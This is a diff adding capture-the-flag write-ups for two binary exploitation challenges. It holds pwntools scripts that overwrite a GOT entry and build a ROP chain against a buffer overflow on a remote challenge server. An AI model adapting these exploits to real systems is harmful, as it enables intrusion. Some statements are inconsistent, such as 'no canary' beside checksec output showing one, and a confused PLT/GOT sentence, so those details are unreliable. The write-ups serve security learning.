@@ -381,3 +381,157 @@ r.sendline(payload)
 r.recvline()
 r.interactive()
 ```
+
+### Get My Got
+
+This challenge is centered around the procedure linkage table and the global offset table.
+
+When we check the file type, we see that it is a 64-bit, dynamically linked, and not stripped.
+```
+getmygot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c6ef3b5b912639ef8ed0b69e607a84a1b73bf5f6, for GNU/Linux 3.2.0, not stripped
+```
+
+File protections show that there is a canary with NX enabled. 
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   67 Symbols	  No	0		0		getmygot
+```
+
+When we run the binary, we are just prompted for two inputs.
+
+#### Reversing
+
+The vulnerability is clear as day in this challenge. The program simply takes a ```long``` as input and used as a pointer. The second input is another ```long``` that is used as the value stored at the address pointed to by the first input.
+```
+004011f3  int32_t main(int32_t argc, char** argv, char** envp)
+
+004011ff      void* fsbase
+004011ff      int64_t rax = *(fsbase + 0x28)
+00401215      puts(str: "Can you get my got?")
+00401221      puts(str: "Probably not tbh...")
+00401239      int64_t* var_20
+00401239      __isoc99_scanf(format: &data_402034, &var_20)
+00401251      int64_t var_18
+00401251      __isoc99_scanf(format: &data_402034, &var_18)
+00401261      *var_20 = var_18
+0040126b      puts(str: "Guess you failed")
+00401282      if (rax == *(fsbase + 0x28))
+0040128a          return 0
+00401284      __stack_chk_fail()
+00401284      noreturn
+```
+
+There is a win function called ```get_flag()```. With a canary, a simple ```ret2win``` solution is probably not the ticket. What we can do is use a GOT entry for puts and replace it with the address for ```get_flag()```.
+
+#### Procedure Linkage Table and Global Offset Table
+
+The Procedure Linkage Table (PLT) and Global Offset Table (GOT) are data structures used in dynamic linking. When the program is compiled with dynamic linking, external functions are not copied into the binary directly. Instead, they are "linked" into the binary using these two data structures.
+
+The first time a binary calls a library function, it checks the procedure linkage table. The procedure linkage table will contain a pointer to an entry in the global offset table. If it is the first time the binary is calling this library function, the global offset table will simply point back to the procedure linkage table entry for that function in order to invoke the subroutine to locate that function address in memory. Once it is found, the global offset table entry is updated with the library function address and program execution is transferred to the library function.
+
+This can be exploitable in a number of ways, but all of them rely on replacing the PLT entry with the global offset table entry of choice.
+
+#### Pwn
+
+The solution is pretty straightforward with ```pwntools```. Running the following script yields the flag.
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+
+target = remote('forever.isss.io', 1307)
+#target = gdb.debug('./getmygot', '''
+#                   b *0x0000000000401239
+#                   continue
+#                   ''')
+
+e = ELF('./getmygot')
+
+payload1 = str(e.got['puts'])
+payload2 = str(e.symbols['get_flag'])
+
+target.recvline()
+target.recvline()
+target.sendline(payload1)
+target.sendline(payload2)
+
+target.interactive()
+```
+
+### rop
+
+First we need to check the file type.
+```
+rop: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=a21aca21e741cb489157fd548b8cad8de5f8a439, for GNU/Linux 3.2.0, not stripped
+```
+
+Then the file protections.
+```
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   1882 Symbols	  No	0		0		rop
+```
+
+Running the program writes a prompt to the screen, takes input, and then echoes it back.
+
+#### Reversing
+
+The program is very straightforward and simple uses our favorite function ```gets()``` and saves it to a variable. With no canary, gaining control of rip is as simple as overwriting rip.
+```
+00401d65  int64_t main()
+
+00401d78      _IO_puts("hey bb")
+00401d84      _IO_puts("whats ur name")
+00401d95      void var_48
+00401d95      _IO_gets(&var_48)
+00401dad      _IO_printf("hey %s\n", 0)
+00401db9      _IO_puts("see ya!")
+00401dc4      return 0
+```
+
+We also have a win function that takes three parameters.
+```
+00401dc5  void get_flag(int64_t arg1, int64_t arg2, int64_t arg3)
+```
+
+#### Pwn
+
+Going off the name of the challenge, we are going to use a nice ROP chain to invoke ```get_flag()```. The 64-bit calling convention for functions is the first parameter is stored in ```rdi```, the second in ```rsi```, and the third in ```rdx```. We just need a rop gadget for each of these, and we can simply chain them together.
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+offset = 72
+get_flag_addr = 0x401dc5
+arg1 = 0x1337
+arg2 = 0xcafebabe
+arg3 = 0xdeadbeef
+
+# pop rdi; ret;
+pop_rdi = 0x00000000004018c2 
+
+# pop rsi; ret;
+pop_rsi = 0x000000000040f23e
+
+# pop rdx; ret;
+pop_rdx = 0x00000000004017cf
+
+target = remote('forever.isss.io', 1306)
+#target = gdb.debug('./rop', '''
+#                   b *0x0000000000401dc4
+#                   continue
+#                   ''')
+
+payload = (b'A'*offset) + p64(pop_rdi) + p64(arg1) + p64(pop_rsi) + p64(arg2) + p64(pop_rdx) + p64(arg3) + p64(get_flag_addr)
+
+target.recvline()
+target.recvline()
+target.sendline(payload)
+
+target.interactive()
+```
+
+Running this script yields the flag.
+
+
